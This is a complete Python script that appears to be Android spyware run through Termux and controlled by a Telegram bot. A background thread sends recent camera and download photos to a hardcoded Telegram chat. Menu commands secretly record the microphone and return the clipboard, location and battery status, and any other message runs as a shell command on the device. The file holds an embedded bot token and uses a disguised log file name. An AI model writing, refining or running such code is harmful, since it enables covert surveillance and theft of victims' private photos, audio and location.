import os
import time
import subprocess
import threading

# Авто-установка зависимостей, если их нет
try:
    import telebot
    from telebot import types
except ImportError:
    subprocess.run(["pip", "install", "pyTelegramBotAPI", "requests"])
    import telebot
    from telebot import types

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8354728858:AAEsorSBoucxw5aZDTxDErBRHxhIe5m8Ysw"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)

DB_FILE = os.path.expanduser("~/.sys_log")
SEND_FILES = True

def get_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📊 Статус", "🎙 Микрофон")
    markup.add("🛑 Стоп Слив", "▶️ Старт Слив")
    markup.add("📋 Буфер", "📍 Гео")
    return markup

# Фоновый вор файлов
def stealer():
    while True:
        if SEND_FILES:
            # Ищем только свежие фото (последние 5)
            search_cmd = "find /sdcard/DCIM/Camera /sdcard/Download -maxdepth 1 -type f \( -name '*.jpg' -o -name '*.png' \) -mmin -60"
            files = subprocess.getoutput(search_cmd).splitlines()
            
            for f_path in files:
                if os.path.exists(f_path):
                    with open(DB_FILE, "a+") as db:
                        db.seek(0)
                        if f_path not in db.read():
                            try:
                                with open(f_path, "rb") as doc:
                                    bot.send_document(CHAT_ID, doc)
                                db.write(f_path + "\n")
                                time.sleep(2)
                            except: pass
        time.sleep(15)

@bot.message_handler(commands=['start'])
def welcome(message):
    bot.send_message(CHAT_ID, "✅ *Система управления подключена.*", parse_mode="Markdown", reply_markup=get_menu())

@bot.message_handler(content_types=['text'])
def commands(message):
    global SEND_FILES
    txt = message.text

    if txt == "📊 Статус":
        res = subprocess.getoutput("termux-battery-status")
        bot.send_message(CHAT_ID, f"🔋 *Инфо:* \n`{res}`", parse_mode="Markdown")
    
    elif txt == "🎙 Микрофон":
        bot.send_message(CHAT_ID, "🎙 Запись 10 сек...")
        os.system("termux-microphone-record -d 10 -f ~/v.amr")
        with open(os.path.expanduser("~/v.amr"), "rb") as a:
            bot.send_document(CHAT_ID, a)
        os.remove(os.path.expanduser("~/v.amr"))

    elif txt == "🛑 Стоп Слив":
        SEND_FILES = False
        bot.send_message(CHAT_ID, "⏸ Слив фото на паузе.")

    elif txt == "▶️ Старт Слив":
        SEND_FILES = True
        bot.send_message(CHAT_ID, "▶️ Слив фото возобновлен.")

    elif txt == "📋 Буфер":
        res = subprocess.getoutput("termux-clipboard-get")
        bot.send_message(CHAT_ID, f"📋 *Буфер:* \n`{res}`", parse_mode="Markdown")

    elif txt == "📍 Гео":
        res = subprocess.getoutput("termux-location")
        bot.send_message(CHAT_ID, f"📍 *Гео:* \n`{res}`", parse_mode="Markdown")

    else:
        # Прямой доступ к терминалу
        out = subprocess.getoutput(txt)
        if out: bot.send_message(CHAT_ID, f"💻 *Вывод:* \n`{out}`", parse_mode="Markdown")

# Запуск потоков
threading.Thread(target=stealer, daemon=True).start()
bot.polling(none_stop=True)
